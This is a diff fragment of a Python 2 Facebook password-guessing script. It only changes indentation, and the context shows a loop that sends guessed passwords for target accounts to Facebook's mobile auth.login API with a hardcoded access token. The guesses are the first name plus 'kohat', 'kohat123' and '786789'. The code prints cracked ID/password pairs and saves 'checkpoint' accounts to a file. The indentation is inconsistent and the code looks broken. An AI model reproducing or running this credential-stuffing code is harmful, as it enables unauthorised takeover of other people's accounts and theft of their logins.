@@ -582,7 +582,7 @@ def pilih_super():
 											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
 											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
 											                                       oks.append(user+pass9)
-                                                                                                           else:
+                                                                                                                    else:
 			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
 				                                                                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;96mCheckpoint'
 				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
@@ -591,8 +591,8 @@ def pilih_super():
 				                                                                                                   cek = open("out/super_cp.txt", "a")
 				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
 				                                                                                                   cek.close()
-				                                                                                                   cekpoint.append(user+pass9)
-				                            else:
+				                                                                                                   cekpoint.append(user+pass9)  
+												 else:
 										                           pass10 = b['firs_name'] + 'kohat'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
@@ -613,8 +613,8 @@ def pilih_super():
 				                                                                                       cek = open("out/super_cp.txt", "a")
 				                                                                                       cek.write("ID:" +user+ " Pw:" +pass10+"\n")
 				                                                                                       cek.close()
-				                                                                                       cekpoint.append(user+pass10)   	
-				                           else:
+				                                                                                       cekpoint.append(user+pass10) 
+												else:
 										                           pass11 = 'kohat123'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
@@ -636,7 +636,7 @@ def pilih_super():
 				                                                                                       cek.write("ID:" +user+ " Pw:" +pass11+"\n")
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass11)   	
-										                                   else:
+										                                  else:
 										                           pass12 = '786789'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
